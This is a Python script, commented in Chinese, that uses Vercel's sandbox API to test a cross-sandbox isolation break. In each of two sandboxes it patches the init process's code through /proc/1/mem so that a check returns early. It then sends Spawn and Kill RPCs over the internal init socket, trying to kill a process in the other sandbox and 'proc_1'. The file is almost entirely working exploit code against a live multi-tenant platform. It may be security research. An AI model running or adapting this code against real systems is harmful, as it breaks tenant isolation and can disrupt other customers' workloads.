# -*- coding: utf-8 -*-
"""实验J278: processId 跨沙箱测试
A 沙箱: patch + Spawn sleep 600 -> 得 procId
B 沙箱: patch + Kill A 的 procId -> 若 A 的 sleep 死 => 跨沙箱!
同时测: Kill "proc_1" (PID1?) 行为
"""
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    t0 = time.time()
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    dt = time.time() - t0
    print(f"=== cmd[{label}] status {c} wall={dt:.1f}s ===", flush=True)
    out = ""
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                out += d.get("data", "")
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    if out:
        print(out, flush=True)
    return out

def create_sbx(name):
    api("DELETE", f"/v2/sandboxes/{name}?teamId={TEAM}&projectId={PROJ}")
    c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
               {"projectId": PROJ, "name": name})
    if c != 200:
        print("create %s FAIL: %s" % (name, r[:300]), flush=True)
        return None
    return json.loads(r)["sandbox"]["currentSessionId"]

def patch_code():
    return r'''
import os
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)
old = ra(0x77ba00, 5)
print("OLD", old.hex(), flush=True)
if old == bytes.fromhex("4c8d6424a8"):
    wa(0x77ba00, bytes.fromhex("31c031dbc3"))
    print("PATCHED", ra(0x77ba00, 5).hex(), flush=True)
else:
    print("PATTERN_DIFF", old.hex(), flush=True)
os.close(fd)
'''

BG_SPAWN_ONLY = r'''
import socket, sys, time, struct, json as _j, re
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.settimeout(8)
sock.connect("/run/vercel/share/init.sock")
msg = _j.dumps({"command": "/bin/sh", "arguments": ["-c", "sleep 600"],
                "environment": []}).encode()
body = b"\x00" + struct.pack(">I", len(msg)) + msg
req = (b"POST /vercel.sandbox.spawn.v1.SpawnService/Spawn HTTP/1.1\r\n"
       b"Host: init\r\nContent-Type: application/connect+json\r\n"
       b"Connect-Protocol-Version: 1\r\n"
       b"Content-Length: " + str(len(body)).encode() + b"\r\n"
       b"Connection: close\r\n\r\n" + body)
sock.sendall(req)
data = b""
sock.settimeout(6)
try:
    while True:
        d = sock.recv(4096)
        if not d:
            break
        data += d
        if b'"started"' in data:
            break
        if len(data) > 30000:
            break
except socket.timeout:
    pass
sock.close()
m = re.search(rb'"processId":"([^"]+)"', data)
open("/tmp/pid_a.txt", "w").write(m.group(1).decode() if m else "NONE")
'''

BG_KILL = r'''
import socket, sys, time, json as _j
proc = open("/tmp/target.txt").read().strip()
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.settimeout(8)
sock.connect("/run/vercel/share/init.sock")
kbody = _j.dumps({"processId": proc}).encode()
req = (b"POST /vercel.sandbox.spawn.v1.SpawnService/Kill HTTP/1.1\r\n"
       b"Host: init\r\nContent-Type: application/json\r\n"
       b"Connect-Protocol-Version: 1\r\n"
       b"Content-Length: " + str(len(kbody)).encode() + b"\r\n"
       b"Connection: close\r\n\r\n" + kbody)
sock.sendall(req)
data = b""
sock.settimeout(6)
try:
    while True:
        d = sock.recv(4096)
        if not d:
            break
        data += d
        if len(data) > 30000:
            break
except socket.timeout:
    pass
sock.close()
open("/tmp/kill_resp.txt", "w").write(data.decode("latin1", "replace")[:600])
'''

# ===== 沙箱 A =====
sidA = create_sbx("expj278a")
print("A sid:", sidA, flush=True)
run_cmd(sidA, patch_code(), "A_PATCH", timeout=100)

CODE_SA = r'''
import subprocess
open("/tmp/spawn_only.py", "w").write(%r)
r = subprocess.Popen(
    ["setsid", "nohup", "python3", "/tmp/spawn_only.py"],
    stdout=open("/tmp/sa.log", "w"), stderr=subprocess.STDOUT,
    stdin=subprocess.DEVNULL, close_fds=True,
)
print("sa pid", r.pid, flush=True)
''' % BG_SPAWN_ONLY
run_cmd(sidA, CODE_SA, "A_SPAWN", timeout=100)
time.sleep(8)
rA = run_cmd(sidA, 'print(open("/tmp/pid_a.txt").read().strip() if __import__("os").path.exists("/tmp/pid_a.txt") else "MISSING")', "A_GETPID", timeout=100)
procA = None
for ln in (rA or "").splitlines():
    ln = ln.strip()
    if ln.startswith("proc_"):
        procA = ln
print("A processId:", procA, flush=True)

# ===== 沙箱 B =====
sidB = create_sbx("expj278b")
print("B sid:", sidB, flush=True)
run_cmd(sidB, patch_code(), "B_PATCH", timeout=100)

if procA:
    # B: Kill A 的 procId
    CODE_KB = r'''
import subprocess
open("/tmp/kill.py", "w").write(%r)
open("/tmp/target.txt", "w").write(%r)
r = subprocess.Popen(
    ["setsid", "nohup", "python3", "/tmp/kill.py"],
    stdout=open("/tmp/kb.log", "w"), stderr=subprocess.STDOUT,
    stdin=subprocess.DEVNULL, close_fds=True,
)
print("kb pid", r.pid, flush=True)
''' % (BG_KILL, procA)
    run_cmd(sidB, CODE_KB, "B_KILLA", timeout=100)
    time.sleep(8)
    rB = run_cmd(sidB, 'print(open("/tmp/kill_resp.txt").read()[:600] if __import__("os").path.exists("/tmp/kill_resp.txt") else "MISSING")', "B_KILLRESP", timeout=100)
    print("B Kill resp:", (rB or "").strip()[:400], flush=True)

    # B: 也测 Kill "proc_1" (PID1?)
    CODE_K1 = r'''
import subprocess
open("/tmp/kill.py", "w").write(%r)
open("/tmp/target.txt", "w").write("proc_1")
r = subprocess.Popen(
    ["setsid", "nohup", "python3", "/tmp/kill.py"],
    stdout=open("/tmp/kb2.log", "w"), stderr=subprocess.STDOUT,
    stdin=subprocess.DEVNULL, close_fds=True,
)
print("kb2 pid", r.pid, flush=True)
''' % BG_KILL
    run_cmd(sidB, CODE_K1, "B_KILL1", timeout=100)
    time.sleep(8)
    run_cmd(sidB, 'print(open("/tmp/kill_resp.txt").read()[:600] if __import__("os").path.exists("/tmp/kill_resp.txt") else "MISSING")', "B_KILL1RESP", timeout=100)

# ===== 回 A 检查 sleep 是否存活 =====
time.sleep(3)
rA2 = run_cmd(sidA, r'''
import subprocess
r = subprocess.run("ps -eo pid,ppid,stat,etime,cmd | grep -v grep", shell=True, capture_output=True, timeout=8)
print((r.stdout or b"").decode("latin1", "replace"), flush=True)
''', "A_PS", timeout=100)
print("A alive sleep check above", flush=True)

api("DELETE", f"/v2/sandboxes/expj278a?teamId={TEAM}&projectId={PROJ}")
api("DELETE", f"/v2/sandboxes/expj278b?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
